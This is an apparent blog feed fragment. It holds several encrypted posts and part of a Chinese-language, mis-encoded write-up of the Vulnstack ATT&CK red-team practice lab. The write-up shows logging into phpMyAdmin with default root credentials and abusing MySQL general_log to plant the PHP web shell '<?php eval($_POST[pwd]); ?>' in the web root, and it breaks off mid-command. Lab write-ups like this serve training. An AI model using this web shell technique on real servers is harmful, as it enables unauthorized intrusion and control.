3ad8793da6f68c38aafe689a68a2e1c9e14c96d597c9c1022dfccdac4b46112c410fee6cda806ece71c8224a809e07e7d086ee0bf7c78e04a27538a4ab88cb7666fca1c5f3f385a707536f9db531492800b79d6760791656306f36b87bcb508d4b7babaadd93ab2877fec5ab1d63936a3d73276bec8ab1bc9e37c5bb8cfd52e650d7639066c6d4b6641b4a8ff6f73ab10cd092a922501f49e5adeaddec44639fd1935b8ca1a1f083d95cd333c1adcf0c8b9c81ae32ff5cebd2780f993ac53c09e8a3f4f3fc367359c4ec00bf6e55988cbf2b111eb30fa7ec6a3baa2a9c681ea77b03d260c1c357cb2e79118ac2e5fd58b7de0e798d0bf67055d4c8a9f07671b8545aab652cfd65fe99ef3d7a41620ef581471645778975f478177f2bf85dddaf4dfe8247c9834866a4dd3c8a0bc26e147a73369ab9a13c6dca15c040276aa4adaab47225f67940252121dfdce23e575daa5c006dcef16560361ca27eb5b74ae6a547376c73a50834fd7c58b6e2f56f6efd967cae0ff859afd2f0b237e44816ccc026853308d1f8774770ee80cb415fd81e7d3b12683429e03169b9f5fb4a3bced85155ac808a2fd8541402c80c63fd7e03ca8248d7a12b5545db6d6c20d9e780b13c8207be4343216613cc47bd9e49ac8c294d0845b053a167961727f178e29867c00978f1ecd43f1c590ab9ca39194ad04487500ba67407fb36159e0de66d252aa0fe11f8831f1a8a5921bc6087a30ef0cd215c28b3feb75a111f97c9606cc21227ebcd75b47037dba87efb31438bb8836143e945976aff823834bd8cd34e35fa3384f3b6700a0acb83b1f2081e14554a909be29c3669f907eade483197f467eda556201ee574c6b4f10c22986499918dfba38faeb4150d845cfac7a60de1a733a7a3516be9abedfc60c3a49128cb0053dcbd0faa1a7b8ed0fbedca841df14207cfb0ee092009d8161dae44824765d0f7f47615f5d02e11af329b501fa3308564093df7108e28efdcfdc8fb0fdc33c3ee28f4ee7476edf98bcad9e97890329f1949abfc7daf29c23a4cacbaaa6ed4b9740423f62b64962539043f6d13dc3134d42088330205156748e941ad5bf2f6d82d2a4fd3c9ea398248074b94b013a30243caae2c51362acc048f9e38e1dc7d398f0409576fec4e3951be8bb025abe6dae47d87427e23364c98e6435a8943c3ddd5c94a5b1946c9023e8feebb133adfd3af138256602dc5f0809ab1cba3a7594106e9137ffe1bcee0b0f21893a7995dce1736c659da587aa49e44dd5fa2bdb8f48e64ce8903b42a2590759a6757358d2cc23ea6e5fd47781caebeb75af1e0b83cb6bcbb6844ea8978460fbc5e54e89352273906907219515520045238ebf5b5ef20fe291c63ae24584d9bdf12eff53d1a74263460858a03b01b36036fc226ecf1cfb26f936c2d6b06e6e36a486c014cd75dc2b8647d3806ca596fc9083dcb25093ad2e83d9aa7177432ac8ee2a58b0ccce806783b0db5febd60fe1c025cbe4e36c2251b3e12770c25953d89214ce50586b96da80e73d3cf8ee5a58a631134463bf86843e9a3fa84392237be4a219a3b3ebc25f88ceb06da5296eadfac501adb6eb01b03ecf59295fcbb5d57b7a1bdab24b1dbca93c8a523091ad2f156bac090a35b49c63cc7158f0b1ea7c9cc683681df322faa44b0c067ce2e8082fdcc1c8980c04b87bb2d8db9d5a9372333561e645c282a9f1948bdadf8f1f79457c75696d97e56e80b834a4764feb7dca84effcd4f36a99e9bc7563b7f62f792319db29618a2e1fb3c400faa6205694d65eab2ef7510913c4ba004b2a825e6df9470cabaea4135f6f57151a7bbe19d4c1a752a921f833948a11d0397ccf05ffeae31e6e47e5754cb3b13b0f2f2b6f30a416211362307a4f226e75434aad623abc4cf71061d193d1527c4aece46fff5edb06873a5c10a0f1adaf1c577e7b05ded5354ad79ff14dd95fa457e34763fa5e7edc1f9a0deb141015e4b31f2af171fb48b37dee46bc03a79ba8c24bd1362c8c902f9ec0b0ab9a52018e2b3996b7e0c0c81c627bf0e43ae27c606296f23e7580747bf9cfc18c4df29d250f5ed67cd5ba617da0ee59a9140410ab41d3f6f49e61cc68d69d52946aa5d89619ff7383617d203e9110516389069a7cf80c07d0806d97691021f1e81f4e7e89f365292e1b1d83ced111a822e048f374ddbe3eae92d1ee6328568deb9e186c2d9ee5c33fd29a2bf4c67e02e717a387236996345e2974bb3012eccd40c3cf773e69cfbce49dc4e0a3a2bfc7adb00e60ee6d023aaad882e03059d8d36d7d1e8d779f1655cf7cc9ac7a222fceb974d3a25c5e47803642e7f7637a09abaa46a26fac415744f276ce5ccbb823b19fe80ad4b2f898398ec8f2b2926563f59fdccd8bc9e37260f42315ce7721cac12f3000d0a85dd561161c32d7a4b8931f75174bae81ccfa3a13d9473fc4d3ab46d912f07d51d38ec61fa1ea822c9789ba385bfcd52b0d6f907e3f3948b2d9cdd51503d55e7692216ee1e2efa7d5ddd33142a957cb1f4bb02a71eca45a78e1f0cdcfb946d2a47c1aa63f4d705a8278a0612370ecdca14a4c586d26a340b4621966120b09eafd7494dab650423cd29b37304962971baac347ea6217ab95e4a6898539cedbcdf32f6595ce76612be0ae4de9a34bdfa887ad9fb7c2e353fd29fd6cdc918c2e93e17bbd45370f126dd1f81c74183e88aa6a737c8200e8dbccc4a04e4c3df00cd56c072862dba61d4e913abf128bb47e383eb70300574ac404b967bc682ff542276e923e30a739d612c7c3cc8e3e65ed6ec80a7e5307416e423a4396d7403dbb237638e623d67370b0ac9859df36c1273505f5a83b90b18d535a7c3f67b23d58e929ed37f9cd5e23080697a13fa8844b82d9ec5f3edc5d6cbd67289d65e1fc2aca56458005ac1c77989f634fc053efc3943dc7138ea5058f69c2cef3c384ef152fa139b97d35fb0a2368a8143360637a2517a19337d373de95bfecda768cf7584d8cccffcade0736e07d95ce21ce93db25cacd697865e56e9f3bc3e1eea0f614c57185bc61c87e6628c6f1edbf3c17876b1ccd0e0368128f28e3b95460e89f0a76afd2b24cb18f4d87993cf6fbeed10070a39046c6d6eff51e019ff4aa068283b5be9f3256f64c2f6e056986368001f6588344fd1625e02674943941eafe044f85d1eab9aa226089c957b72b150a7f883713f8427385a9e0a445fc453f1f9e74a84083ca3aa4aa060b1ed94a9f522b6c505c98e997eb8c793c0b4fbb7cca43eeba4dd863bf6e5fe4e6e944ed992e386722bd6b7a136a0d44a61d3443c2814ab503e2692ef7484e543bbd0606cd5cbb99c25d34f1815f9c26f989f24a943b62c98a4a92fcd890a9e3080cdaa83e7d76f1916034314af4172397982de89d29145461e32cb7d0cc983c9efa2d2cc24e834e6db6669e3f61828e7e611bbf63e240e15e3f79d126fc6a2f37f3fa2e2c17284edd6a42c647ec4bae28d01a3c0ab7708ea4e95e285e7284727f92c503bfaa5980875a79d18df20ca9dda536c56d6a32ff98c0b44ebdceb704e9509cfef3a6a01a1f54b2cdb0487df7606d1fed9f1b549ca7e0b43d374475fb98c5288e2b2ed1da335c02eb81f16d2d6d2a14ce5699d6f6c2e47aab564327c7ed131a163c22d38d914fc3b6a7e8edca54e1c160a60463f8f908a0263206420b83c79265eab9c821c4332f1ee5ef8470443a26dc1a3bded38e9fe28592b80146e3784053cc2356bed5dc7ba5bbb1f4d5b2c473ad21c11272422c4afc7e8da9a16d45a9af9812e9e358e5714128aee20b7fff291dd797c37c5dd037e64babd0c69feba4302f2d95b60fee3f4045361ce4dba973b51b193d34a80c69b7d555b1a417edb23d32f6448542b008fe25667728b534ff95429c3006eee4dcfd8a4cd8367071a503c702f1359712138c43d824d04b38eddbaa6742333c1bfa8d81b0aff93e445a6dd6d4005ebc145e3ae779fd3d85dec7ae472fe42fe470e24eec1971c2c8ffcfe64f4350c5705055cfd055d03e093de7435a24ed9c54ed99179496f56db2f17ee0d266dd051dab0048357727a07dbffefd4ba07f597173f80d17dad18711f74431c7276f2fb3786ae4098e623b9222e15aa828775fac1b0e3174c957ad561ae2930cdb5568e11b413e815cc52592c11a7462d56e885b465be19165478006e24208d7fc499489d9c3f9d91cffd83a1c96cd4e94d49f3a26b07861a5ad5ffd0dda21c9188b21c814108806eafe7ddacd1e049bd29d80e02e2fe15da4e840f91e98a37a1ce77e0f9cf5d217bbe59faafc0a82647db9005bd8aa81bd6252150427ff954b4b069003044053fddf716d8e9f5da62bdb322dd0524d6440b5779ff10193ea6c0e8ef96940510d1ab9e590e49d67f082568a111b0ff27b7bf89ff711f3dd87c10c0b035d10c91e7b098a9daa52a07869ca57299c151eab233b767a1299f95385a7c14f7e7ba627a9841e8253c744c826d79bd29f612d7cca33dbff2636476d6f61930133c5f1d3185a515a95961b261db32c330173c82c122ce5ef7d37e65416b9f51c8a8d4976a21d3d7d4b887957d9c67045edc9e69a704de55b657c27ca4f3a2e7bc5d6089ab4d2030bdd9ec7b0637fc3a2031a396ca5bdc439f2c0c7e183707bffc6271b121c7974efe16f1595010003b9f3d5bff2bda2b374c98f0acc5b16fb4ce29e3d56f69dbcd731fd4de2d2e6ba7b5bf3652e2eacedd12888647c09b230b18b9459ff9b2f2c9706eecb0c3e78a1bfa7ba530c4</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> é€†å‘å·¥ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5.Windows Architecture Windowsæ¶æ„</title>
      <link href="/2024/10/01/5.Windows%20Architecture%20Windows%E6%9E%B6%E6%9E%84/"/>
      <url>/2024/10/01/5.Windows%20Architecture%20Windows%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4a2ce63102b6bd36fa38f56c121a3bf3b5748e9a69b0eb8678d15e89c6a6c14f">2239f6ef2369263b61ef594c41be1d81caaad9e00dfd39e2e6679848a71a75425b783f2084bbe71c207ed1c250fb2ed6cefc9a851b67880d7dd7f0b02318ccecec0a1f5749dc5908d23dee16a3508513fe37119411562cbbb5d634a272aff775b8c6a9c62a408918e678f0d6bb87d7f46cea299b2622226a9fb035528ff190134e9c163ea194eb3a48f184695971feddd614fcbdfcdee23dcc63f0f7044910b9fe46108711474677c334bbda688bd66cdcbf0a6666169dbe9027ec7c00ae523c0a8167670f57a8cdeeeff847cb6f13d1a2323c4d3307ecc8662ee01301bac6c0e666d6490fe81d0cdc252b67400d47093fa64ecd9d47ae3bacf30425342665d5af2f0b05fdc30424b7758f7d874610f52eba9f79d1a351059111401a5e239c358a7388b73b113d10c1a80a4539794a50d4e8631bc1d79b9397d33370b5cd992a081d8f88a77ae161cf877c34f8c78c94a32c0b64557692d31a923915ec277287ec04134d53aeefb39d58336decac9c0287654afc1dc3df96e99d41f83ff9f95ad4cc47f554674e1a62cbc1b653b33e9d9f0ee1e5a48935ec615e00a375e8c7c956045955d77aae6c9737abdb8ccef7d854c80d7f9f26487c7461242574aaded28644d7e69a364fb160a732354796043447eb3b0f1816ffec7679992ad561e5b8a109819d73e7918e6f6aa38bcde1fc3b627c2338bf2538f1678c8256d81b014cb7b2d27b2fe00ba3e15e6c804d8806b1b35f0c39b4f1023e5a59ef971e16162ab1eee3337a36e84cecbb111dcb1158957a8953aad18177f2c4ec4fb74715ff8176fcbe60611df03e307d2a7a905ea8421f797d7edd47fc5c3e381789fa42a07feafa9fff6f14b05061808f23d14e7bdf61b5a2b35d57d7b5023e1361fb93d795d2dd960421098af14ddf89b15fb1fb3dc5d0e08c0b76401ee2d2e59f5d35f402ecf5002d5315071f46a4e5a0df6977e2cf5e1bbb38c831cf510ce3effaa4fabc662ee07142ca94cfc74f146f4a526ad4297372999cc8476d0d409ea3aaa3a24b076ab10539c9dae044c6b6ebfb48ff15451946e0a1b1c5f446e45303ecf7253f3a3d5d007264a6d364028974464d2e8da5ea34464b507d6e634b85f76e174d3c488789f978dc63fa324abbcef9dab85f810e104864681b1c893acd1dd8b4c47e91e5e07e708b55fb42176d91591405b3a5da741fa8e03f411962d11f5ba660d55a1fd02e6a8d1353685b932ebf49feb78300399850b9542c1e4e732a1b85c7fb934154da69d9fc69e4d6cb2ff03e770214111e749c7e33915e52717d1fc384a8daec743d40ea8bbf55543af8852a00742a39551db3aab4d61394c22613d07d6d2d80b1c555c68d8ecff47be454701c969399a637e7305c6aae9a80a2dca3c47bd8a92bed556706eabc0e342993632242e4182cf0abc4f85e9383a2c18816247733fce73d6dcda6146c04bfde6fb14d6fadf592d35b54743afa2f652942cfc9933aa77535b8f5382ca12f663eeac4616e24176ad0c8f8e51f41af64dd077a638cd2a0baf117787e09ab7fd78fc7594dd323a53b51c98a91d4f2d065e3c0f8de791723870da8d0d4d5da505fd2147a2bb19952f644e060746e4b2f27dbeb6cf404a7c250687a84803a4a79f69a84f7956e29e683ccb884ae9c191478e1c0504f42629184220f4b48b53484f4a6cc80b892990a50ad95e8592c37bfe1e376961ec4b73192f3b3cd50033979e0eb6fb7b85dbc8eb801a38b0d5e35006177589941f2d1e076f8f7ad87e9ece5f0a6e51bee55ecaa0ee69286e898c36eb25de8a6dd7b29db23023c2990267e9842a51ae9757f75d04dac500ec1e0e213bf903e03c6f00bd07033c85c261e27d7781fdbab724f5c57aaed777544d75c58373af39de2bea5c8ce597e5b90a39d3a29245458971e4c761627f2a11f8a5b9ca4d7d831e9032bd8932dc614512f04fad8a8716852ce31db4c082b00dd868227c33fda9edba0c8150d510bb4f4d9d66916c9abfcbf6d9e83f44bd2fd508d9b2f997197ce6782ef310e939bcde8acdbf088588466848d4c7bd756ca44821b4d76050c2cb07f81253bdae58506c75862d2fc5170dac664896f980bcf58338d6694034b677d009d2ee975317343f1b3158c431e5b7d37f37b5b149b811943a870fec898c74a05e24b598e98e53492191466f57cb24fd82b7e77d2f889b577a0dc95c9f3f412fabe0b4583e3bd9f2b209922778161f7ef14946cc043e14d8419aff4cd3624498b07fd2d17e8c3658065b79ace99be34f03b29144fceb8ff9cae608e84b1ec1696370d481bf5c118e0b719d9ec6fce8d9f41ccef8f324d89d3b2ddb3f1dedeffdf819331b910611e00409b41edd583406cc513c4bc7292d3e19110432fa7c8e04dbc43fa203d99905ec3dfc09a01c7870b177a1a7e1fde403a4d934f7f4b3da00b7d7bc59bc793168b7171c82b40eae28eeed1717a7be936cdbdacfb0f8d9203f6856769285b53f7f4ce3b2323207caa1284dccb4bc663d17322e6047c1aac97359ee1932bf67478081c66f60a2aa612286d3c11698e4bfc0d9273a6932991527a9572ef9f8e72ffeb078302932eafb81c45e1e846f3b9d01f49f8f0641c8c34771e7637e1cacc5105d42bda7367fa548328d210e570cd8f1e364b86a7dbc3151238e22416d6f84e7f1755ea65ce55d42e73ff10d907e75297feff42518b5e3a548a151dc516c2b058b95d923f439ad6e3c7ed8fc2e3715ab22cae729bcef9cd8ee06d9e34d8ddb26ae3480fa7e10b2d44a7628b6ceeb94b5f11ff1992c1e44f24495b667a0a0d4e02dda26405c3503363f0f1a52383e6845b291bd3c4777e601832c6f37f0ba2bfdea3800ed5b26dae5ea68a533c5da3d6e0a019a3e731b29cf0cc4de0aebdaabf3d33421a7bfefb62160a7db4ba134daedcef2d00d557e60cb1b5552556730f36f41783f6a1cfbe6dd6c5fac1a1a86f617294f11b11b389d6363b4476928841f870623f983a1e4aadf99645fbbd8c5e6d2637108fdab52b0b3e05ca86333382ad8c44b2600b6a08ca07baa699fec65358b31946f28fbaab068b16c562af9749f4b4f0eeb9c1894eacc477ba835bff0bdbab2b8cb2d738f857c47334e22eb6f4b44b373a093082fb74ddc928b3dba1331c84f94bdd81757a90badbee48269a24b564220043e5344a3af0fcabcd0dc8af4063ba43795ef6c606de4d3321fad8b771a214ab3e3a3d58293d780d901c8c7ce87c875d8ee2a4fffdcaf53f92bf29e6debe78f9c868f951c37b282e6755466e641ed5600c619e5129c5d300e4bf4921b5c38d12ff1bb375563f10a23f8fd133d40f0c22c58c4ac02f156253718b5db7eae3bc89541bc5f1eab2b91444386935c00a744ade8177c2348597334d70a24e5f0a216ed282f6a09358135768431741cf59079929fdef4a367f59327a03f0b6dc037c9e10906e78bbc746e3247f78cf6e5b63ce378c4872061cdd530ca49a04aa0d35b6d33902bb28a106636b65ff82d55aaa3ce26d0b39a6277a65d9f567c429bcc7e667ef1afc4e675e87a93991ccfa1aea55384eaa20d718f9eda7fbcb30d3a84bc0e51dfb68d2beca0c3a305554e386a57bfe2f77e0b1e425563bbbcab4c979941f554bcc44e059c44829233e3559fb4e1d8fff1ec1dd03a45e45b889f910beedb9a889329bf377c622b56f892b6235ad81419980523e5886e02c12077b939aba67a02c6cbe9e3470616f28c21aaa3815550c4afbd2d918c4a28c47f42e79fa07f847d903ef3bdb6cc081a663e8318181b1d2692aed7ef5861598194e76b4eeb345a14c207dd3bae0002d0ca3aa7da15df6583b4437dd82ba6c0a9a183c54a44ca9b5e56c42871aaf0d1546fbc66da304e83661cc4fccb00e3cb60424f3c5e77f5965aca5b89b2cb8a7caf41da86968270c7b327a617808e9c4f7000156f5ff6ca51f020de0c5b5b856c90dac7741432e46a9c61d97b3dace6fa951d24245c9396ddd29bff0157e89dda054b493c5370a74eda4f07c2425a386490c0d482fca0e007648d6d5a73c227d39e4e51f984810751aedbf4b685026b94f1c4819c130f8560783ab97468696663b96363012cc04465be3261363a1babe51cb9a44456afc908947d01f5eb30304bd95ff571a005b64491d0d996cf43b628f8c6e7d1a5ab5db5fa15a178d5eb979052b8b1707a08bcc66ba4dbc33ea874f92352e5e5b4c32c38d2fb48c3a9620559ec6ebca5696a200f6d91a36b44d7623bd518ac02eb80fd9eb796fcc88f75ae5cc7bf28356d8d7870517cad4b16fbd06e351cd8e67bbe93278bcfa001ee9f0ef9de4147c148aee315685d2b6cff43565baa629ef30c3bbd04b7d814cb73c3fabe683d109ac8b2cca25e2155e115ea60ae07c8fc3fff808af3e1a10d359e096c651b177e3c5bf64f15c61f8253c680eedb977b58d0d29806aa1d62ce34e46378cc70c2ca151cd1ca60990e9506e7cfbcac82346ae62e6340f2ac592fa6d587e4ffd04ce500cf4b25feda3a0d9beab4ff25ce4bf52e2269d6a80296b5fed397cb2d5ea99ff597ffb92507e0461d2beecd6642e45eb92d8343faf0be28830b0695cf4c2c3e9b7f690e02ee4bdc0e93afd909fcaeed97b32bfa6852cb162f7655742e8dc25749c12abe5722075a56444ba9b643c50443ab812cbfd4409d4616ccf4db68493ccd9e5b5cfbc76bdc6681c4af3981280b903cd0e6dd078dda72ad85afe9bc9ee8049cfebc07be71358f0f26190e64db0a71a1cd4122414e6ab9446adcef763dbd026063b13a6403ae73450a68fce2754b3c7d01bc2c3f56a2c33bc49bf89fb0a3c339fbeb1c338874886599d7a1b6846a1d0518d8a5eee3df734bca6b8ac8d838d23bc1e009058a63f43bf2c8117f3986b87d9920fd7d4e3c99d1de07e42674d8ab329f75e70fe920f332b58f98902aa7ec71406e148ee86994a76eed5d082cafc566ba2011e4a2cffacd1bbcc6d1af96efc9b36eb0c3e071ceb2044b33869fd6eb32cbd028016315e9915c29de736ed46483a09a1930c0816f29c7927041f6a1da9dd8c58d5d8ec7f3cbc99c61a97f889237ffe51837eb97fb5495a957bafc480f4125a54c6b313be0a4a4392c54d627ee5f42eb276b5d742bd9a698c430cc874572c8bb777955814e4a26917128600c7d1b1d48bcb9106a556cccb4adfb6b94110cd6eb67ac1fb4c585d14a61336698c863cf7d5e07117ba4a88362f21248362ec6a6fa91de7ec8e0b301bec6db9b45c443cd0664c649a1c4af0cd3ff6436a3707154315d47b536de5af8da495237b3517bb573e1619937c2fbb8af0ba34a4ecf9dd81ad3fe74991f2ea682ce21f84bd21727fecf5ee153d59d060fbdf5a0c195587b5a3e8294e0cf1c41f506732b15c21f56269f15de98d864fa8b8e71fee64fe347d100cb93b6265401a72dea81befcb576c4fc9de1cf4d804871403ef2085292191a445344b75499ec956da29d1b10f77b61560974ef05b0b1062a7bf4ef682d5c06686f21e70ede6e8bdb1cf11cc7da9d7926ebeb055e7f2bea5a86e5e0f25a5daa3f5935512b50fdfb934e5594d9f1d2a4f897a3dbf7df4ada3be40bd06af8411cd6de12f8b25c861f4cc3227a994f2dc8796d868d8b1d1ee7a01b0ed895db8dcead26cebf9cf6c6b3fcc385d2db5a3137d841f59e27a7964c3b94e3926bd9cf7e40ebcf747d587c32df17a1e7efbf754f44da349eef2daa9258299396549790632c310df26f386de53121f8b81c464e83ce36be091d14aefb2cc13f24d27ea11ce0cf103e99372f919caac6c206a81e0f47d637eb9b710941120bdd264f0af10463ef9f262325565a1261815f1274764b130d3ffc67edcacb3de7b4f098b458b204d455b12d2579a069114b64fab9172afed1969d4dd2429c756cfedb097048c6ce1ae5bc37d394701d276cd542c1f44ea64916ac634786044b672bdde3fe97e441d014e13a731bc0cf7484d8978e33ef9688184af8cd6892ce75a962fcf2640e1d6e71d157418d22210c3a504ada211ad1c9b422e6c823abd9c4a8f6693f0c2a2ce88acaa6d1bc98bd32f92ce31afb1479cc13238bafb10b24af03bf3436f976ea6c3e28a8f80e6f1fc90984da29d7f460e5660282933b99ca73247eaad04eb0d8983b923838d6daaa4dbffd8e261d5d55b45832e00536e49a58720f7d834acd3ccb8e2e1cb53a7de280c536cf52be281b28ee23165c382f0319f6eca143fa7c4605ead0c6d112e99c99bc9891e3b3381a3c6c36257a362a2f360ff6699cfe05fde4a8ebb0c86069ec2231a50cd2cb606d6f502e70887de08a7f19faff7a9d60a5d607a31caea0fb56cf9831b6133b308e7001cecc4ded84ea3f2c5f4969c44791a2d10cf49f22184dc8305eaba6536dff0276ee925738cec341bf5111390265e076ac6aa2b47e09384fef35b955337782fd219a95c051026296fcddd06194b570d5a4deaf1b3a3ec6b246a93e655501571d576f4fa32d02aa5a2a60bd807554d608a5e70eb6abd21cf12d4aa2f54dd76db3c2373fcf52e6493bb7155c05ed675b546fd50221fd3dd55834b3d8d9a5bee8417f338bf7d733f15910284525b86d8153449acd99a17cabf1a81f830864e2d5e116f74125b3462dee23225b89ba40bfa858d177a181565574a1940e248caab6f26e54cffd9d438bd15de2bb691df104d755c617fd3c50f030bcaedbc8e449b1f53b35263fbf694578d812d26d7b694726f654e3a8af60b410c99e6de0526605aee9bd54b33b4cce2030b1309d2c9d05571e1aee5fb2e855b33255cd609c320ce4f45d253d3e0f632c12a4ea8d443130f8d0bac2895d4b0326371f2027978297a45da8ab7ad8e2a864a067d83e5c4253c9bea30659e6dc650ec840a00bfa1ef6574030090168bb6bd30ffa89c66ee09815369cd2058d9d0bc73a38f2f49b8c270ab8a382809f2d9d6f43d1e31cbfba00dbd8d44f4e67fdd0b2cc8e06fd878d4fa2179430a9eb6bf7c5f4f489c30ff978a51fe64102d0a58f71abd6b9518cbdaa69f1ad6b1988f14cedc6db0fe061c877647f83f57b7d6404c2e4a242568bb60ff87a16da258ef58a220db6404aaa18f7fe96e1b513f496877b418894d93d64a05116c3a63f56cf877b8a9a84e01a98e60475b5843628fa37899f8c64fd577301af5bab9ee0ceb5595c4fd4adb496bfec9b83acf80d794f7ba8bfc04a5b41837aa202ae78351ab4177377b4c7fdf4a88f8e33f354eca9f059fde1a7378b7a27953d96f1b6b31a070c8e1c1419a487c00e0eb364e05b8c12751079623a1363e1a370f9617b9f500cfb91631f7229387fca549a43f127bc97a2bcacaf73ddd2dbb650f70e4338310fd15bc3c6127418ee4150c42db0645456f738ae6b742651ec01c37b142fcae69359057f9050ca2b8696ed2fd756ff4fb242b82b5a8340fe13b6e8fa125a32b83b6777f21858a700181506cde27028476f1720a03eab284e23f046009e8755b3b833c335f51b4356994a603c4ce8200aaa290f25182e0cc534441f473b16ee4e5ee2ef7eabfd11b4a5d4c9f08d3d33505cb4ab33b7a65c327942b6465951ea335ffe9c9f2fceb65323c46ddbc0ba79117e909af1d5539db374c18738ce248c85eb6872f215bb87687118b3ec626d61a6d1e67d9bf36ae536375f64742cc2d787c4e69a9d7469242542f63a164ebc14dd7e7cbcfeedc5cd0cf4e36db4d73866927c1467dd0535106e7c2b6dcef8d55c0f6e02645cc0145193d15c8b1816253f8f1096309b1a1720af092af338f2482f844ae13b996368b6b586f3efd33d41e8ffd86e746e1b0458d2e0aa3904aaed4e3e2ebc8abad9d95b63e61db81585ff00eb8d5f980ac99a19d785ca01604e680363630267e277b1523a49a95f5b4ce309eff059787bee6cedee51b49f17c871ce5d013c4e6a68fd02461304a53267a82ed32fd159c7fa78b610e1ecbcf347bd7245c0c5929c3a76f5c31d1e3378d022cf02894979c1d2039f0a633746a1621f8947f0d55f504bc39fc28b67564c8de93d3ee95130f8b462a271a1a81ae6149cf35c9e5457828ec4ca39e6773ce9d669a5e9168cefbd235c1752c1cd5266a55ce935d7af3da24c9d043f731888f696fbf18feae75639d3a93728d8773c2c55ed757131e628f94df3140130f249fb2bd15e75e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> é€†å‘å·¥ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CKçº¢é˜Ÿè¯„ä¼°å®æˆ˜é¶åœº-1</title>
      <link href="/2024/09/27/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-1/"/>
      <url>/2024/09/27/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ä¸‹è½½åœ°å€ï¼š<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">æ¼æ´è¯¦æƒ… (qiyuanxuetang.net)</a></p></blockquote><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>ç½‘ç»œæ‹“æ‰‘ï¼š<br><img src="/Rxi134_FILE/d7dd99fe113508cbf08ada16b18c69ca_MD5.jpeg"></p><p>åˆå§‹çš„å¯†ç éƒ½æ˜¯ <code>hongrisec@2019</code>ï¼Œéƒ¨åˆ†å¯èƒ½è¦é‡ç½®å¯†ç </p><p>åŸŸç¯å¢ƒçš„ç½‘æ®µæ˜¯å†™æ­»çš„ 192.168.52.0&#x2F;24</p><p>åœ¨Cç›˜æ‰¾åˆ° phpstudy å¯åŠ¨æœåŠ¡<br><img src="/Rxi134_FILE/66b08c3cd34492516801ae06253b9624_MD5.jpeg"></p><h1 id="å¤–ç½‘æ‰“ç‚¹"><a href="#å¤–ç½‘æ‰“ç‚¹" class="headerlink" title="å¤–ç½‘æ‰“ç‚¹"></a>å¤–ç½‘æ‰“ç‚¹</h1><h2 id="phpmyadminå†™é©¬"><a href="#phpmyadminå†™é©¬" class="headerlink" title="phpmyadminå†™é©¬"></a>phpmyadminå†™é©¬</h2><p>è®¿é—®ç«™ç‚¹æ˜¯ä¸€ä¸ª phpstudy æ¢é’ˆ<br><img src="/Rxi134_FILE/6a6179b7a8c5d2368b842b6ea8ae7a36_MD5.jpeg"></p><p>æ‰«ä¸‹ç«¯å£ï¼Œæ³¨æ„å¼€äº† 3306 ç«¯å£<br><img src="/Rxi134_FILE/605b2a9714c8e53b1cdc7c48b6fb558d_MD5.jpeg"><br>æœ‰é˜²ç«å¢™</p><p>dirsearch é€Ÿæ‰«<br><img src="/Rxi134_FILE/2838396d0573f8459b81f3b52a7399b5_MD5.jpeg"></p><p>&#x2F;readme æŸ¥çœ‹åˆ°ç‰ˆæœ¬ä¸º 3.5.8.2<br><img src="/Rxi134_FILE/649c61ddd29d4580811dfdcc03f4972f_MD5.jpeg"></p><p>root:rootç›´æ¥è¿›åå°äº†<br><img src="/Rxi134_FILE/3a56f2a12461d4fad5ecfe87ef16074f_MD5.jpeg"></p><p>ç¬¬ä¸€æ­¥è‚¯å®šæ˜¯å†™é©¬ï¼Œé€šè¿‡phpinfoé¡µé¢æ³„éœ²äº†ç½‘ç«™ç»å¯¹è·¯å¾„ C:&#x2F;phpStudy&#x2F;WWW<br><img src="/Rxi134_FILE/78453fa6fde1da6dbad9fbc2caeabc09_MD5.jpeg"></p><p><code>show global variables like &quot;secure%&quot;</code>  æ— æƒç›´æ¥å†™<br><img src="/Rxi134_FILE/8b5f038fc0e8113cf2f25a5e102a53a6_MD5.jpeg"></p><p><code>show variables like &#39;%general%&#39;;</code>  æŸ¥çœ‹æ—¥å¿—çŠ¶æ€<br><img src="/Rxi134_FILE/e062de56aa4d26682f87334d618d01f3_MD5.jpeg"></p><p>æ‰“å¼€æ—¥å¿—å†™é©¬</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">set</span> <span class="token keyword">global</span> general_log <span class="token operator">=</span> <span class="token string">"on"</span><span class="token punctuation">;</span><span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file <span class="token operator">=</span> <span class="token string">"C:\\phpStudy\\WWW\\fuck.php"</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token string">"&lt;?php eval($_POST[pwd]); ?>"</span><span 